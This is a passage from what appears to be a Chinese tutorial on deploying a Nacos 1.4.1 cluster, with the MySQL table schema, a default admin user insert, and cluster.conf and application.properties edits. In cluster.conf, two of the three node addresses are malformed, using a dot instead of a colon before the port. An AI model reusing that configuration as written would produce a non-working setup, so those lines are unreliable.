class="hljs-operator">=</span><span class="hljs-string">&#x27;config_info&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   数据库全名 = nacos_config   */</span><br><span class="hljs-comment">/*   表名称 = config_info_aggr   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_info_aggr` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;group_id&#x27;</span>,<br>  `datum_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;datum_id&#x27;</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;内容&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;修改时间&#x27;</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;租户字段&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configinfoaggr_datagrouptenantdatum` (`data_id`,`group_id`,`tenant_id`,`datum_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;增加租户字段&#x27;</span>;<br><br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   数据库全名 = nacos_config   */</span><br><span class="hljs-comment">/*   表名称 = config_info_beta   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_info_beta` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;group_id&#x27;</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;app_name&#x27;</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;content&#x27;</span>,<br>  `beta_ips` <span class="hljs-type">varchar</span>(<span class="hljs-number">1024</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;betaIps&#x27;</span>,<br>  `md5` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;md5&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;创建时间&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;修改时间&#x27;</span>,<br>  `src_user` text COMMENT <span class="hljs-string">&#x27;source user&#x27;</span>,<br>  `src_ip` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;source ip&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;租户字段&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configinfobeta_datagrouptenant` (`data_id`,`group_id`,`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;config_info_beta&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   数据库全名 = nacos_config   */</span><br><span class="hljs-comment">/*   表名称 = config_info_tag   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_info_tag` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;group_id&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;tenant_id&#x27;</span>,<br>  `tag_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;tag_id&#x27;</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;app_name&#x27;</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;content&#x27;</span>,<br>  `md5` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;md5&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;创建时间&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;修改时间&#x27;</span>,<br>  `src_user` text COMMENT <span class="hljs-string">&#x27;source user&#x27;</span>,<br>  `src_ip` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;source ip&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configinfotag_datagrouptenanttag` (`data_id`,`group_id`,`tenant_id`,`tag_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;config_info_tag&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   数据库全名 = nacos_config   */</span><br><span class="hljs-comment">/*   表名称 = config_tags_relation   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `config_tags_relation` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `tag_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;tag_name&#x27;</span>,<br>  `tag_type` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;tag_type&#x27;</span>,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;data_id&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;group_id&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;tenant_id&#x27;</span>,<br>  `nid` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`nid`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_configtagrelation_configidtag` (`id`,`tag_name`,`tag_type`),<br>  KEY `idx_tenant_id` (`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;config_tag_relation&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   数据库全名 = nacos_config   */</span><br><span class="hljs-comment">/*   表名称 = group_capacity   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `group_capacity` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;主键ID&#x27;</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;Group ID，空字符表示整个集群&#x27;</span>,<br>  `quota` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;配额，0表示使用默认值&#x27;</span>,<br>  `usage` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;使用量&#x27;</span>,<br>  `max_size` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;单个配置大小上限，单位为字节，0表示使用默认值&#x27;</span>,<br>  `max_aggr_count` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;聚合子配置最大个数，，0表示使用默认值&#x27;</span>,<br>  `max_aggr_size` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;单个聚合数据的子配置大小上限，单位为字节，0表示使用默认值&#x27;</span>,<br>  `max_history_count` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;最大变更历史数量&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;创建时间&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;修改时间&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_group_id` (`group_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;集群、各Group容量信息表&#x27;</span>;<br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   数据库全名 = nacos_config   */</span><br><span class="hljs-comment">/*   表名称 = his_config_info   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `his_config_info` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">64</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `nid` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>  `data_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `group_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `app_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;app_name&#x27;</span>,<br>  `content` longtext <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `md5` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,<br>  `src_user` text,<br>  `src_ip` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `op_type` <span class="hljs-type">char</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;租户字段&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`nid`),<br>  KEY `idx_gmt_create` (`gmt_create`),<br>  KEY `idx_gmt_modified` (`gmt_modified`),<br>  KEY `idx_did` (`data_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;多租户改造&#x27;</span>;<br><br><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-comment">/*   数据库全名 = nacos_config   */</span><br><span class="hljs-comment">/*   表名称 = tenant_capacity   */</span><br><span class="hljs-comment">/******************************************/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `tenant_capacity` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;主键ID&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;Tenant ID&#x27;</span>,<br>  `quota` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;配额，0表示使用默认值&#x27;</span>,<br>  `usage` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;使用量&#x27;</span>,<br>  `max_size` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;单个配置大小上限，单位为字节，0表示使用默认值&#x27;</span>,<br>  `max_aggr_count` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;聚合子配置最大个数&#x27;</span>,<br>  `max_aggr_size` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;单个聚合数据的子配置大小上限，单位为字节，0表示使用默认值&#x27;</span>,<br>  `max_history_count` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) unsigned <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">&#x27;0&#x27;</span> COMMENT <span class="hljs-string">&#x27;最大变更历史数量&#x27;</span>,<br>  `gmt_create` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;创建时间&#x27;</span>,<br>  `gmt_modified` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">&#x27;修改时间&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_tenant_id` (`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;租户容量信息表&#x27;</span>;<br><br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `tenant_info` (<br>  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">&#x27;id&#x27;</span>,<br>  `kp` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;kp&#x27;</span>,<br>  `tenant_id` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;tenant_id&#x27;</span>,<br>  `tenant_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">default</span> <span class="hljs-string">&#x27;&#x27;</span> COMMENT <span class="hljs-string">&#x27;tenant_name&#x27;</span>,<br>  `tenant_desc` <span class="hljs-type">varchar</span>(<span class="hljs-number">256</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;tenant_desc&#x27;</span>,<br>  `create_source` <span class="hljs-type">varchar</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;create_source&#x27;</span>,<br>  `gmt_create` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;创建时间&#x27;</span>,<br>  `gmt_modified` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">&#x27;修改时间&#x27;</span>,<br>  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),<br>  <span class="hljs-keyword">UNIQUE</span> KEY `uk_tenant_info_kptenantid` (`kp`,`tenant_id`),<br>  KEY `idx_tenant_id` (`tenant_id`)<br>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8_bin COMMENT<span class="hljs-operator">=</span><span class="hljs-string">&#x27;tenant_info&#x27;</span>;<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `users` (<br>`username` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">PRIMARY</span> KEY,<br>`password` <span class="hljs-type">varchar</span>(<span class="hljs-number">500</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>`enabled` <span class="hljs-type">boolean</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `roles` (<br>`username` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>`role` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br><span class="hljs-keyword">UNIQUE</span> INDEX `idx_user_role` (`username` <span class="hljs-keyword">ASC</span>, `role` <span class="hljs-keyword">ASC</span>) <span class="hljs-keyword">USING</span> BTREE<br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `permissions` (<br>    `role` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    `resource` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    `action` <span class="hljs-type">varchar</span>(<span class="hljs-number">8</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">UNIQUE</span> INDEX `uk_role_permission` (`role`,`resource`,`action`) <span class="hljs-keyword">USING</span> BTREE<br>);<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, password, enabled) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;nacos&#x27;</span>, <span class="hljs-string">&#x27;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu&#x27;</span>, <span class="hljs-literal">TRUE</span>);<br><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> roles (username, role) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;nacos&#x27;</span>, <span class="hljs-string">&#x27;ROLE_ADMIN&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="5-2-下载nacos"><a href="#5-2-下载nacos" class="headerlink" title="5.2.下载nacos"></a>5.2.下载nacos</h2><p>nacos在GitHub上有下载地址：<a href="https://github.com/alibaba/nacos/tags%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%89%E6%8B%A9%E4%BB%BB%E6%84%8F%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD%E3%80%82">https://github.com/alibaba/nacos/tags，可以选择任意版本下载。</a></p><p>本例中才用1.4.1版本：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026232.png" alt="image-20210409212119411"></p><h2 id="5-3-配置Nacos"><a href="#5-3-配置Nacos" class="headerlink" title="5.3.配置Nacos"></a>5.3.配置Nacos</h2><p>将这个包解压到任意非中文目录下，如图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026233.png" alt="image-20210402161843337"></p><p>目录说明：</p><ul><li>bin：启动脚本</li><li>conf：配置文件</li></ul><p>进入nacos的conf目录，修改配置文件cluster.conf.example，重命名为cluster.conf：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202210182026234.png" alt="image-20210409212459292"></p><p>然后添加内容：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:8845</span><br><span class="hljs-number">127.0.0.1</span>.<span class="hljs-number">8846</span><br><span class="hljs-number">127.0.0.1</span>.<span class="hljs-number">8847</span><br></code></pre></td></tr></table></figure><p>然后修改application.properties文件，添加数据库配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.datasource.platform</span>=<span class="hljs-string">mysql</span><br><br><span class="hljs-attr">db.num</span>=<span class="hljs-string">1</span><br><br><span class="hljs-attr">db.url.0</span>=<span 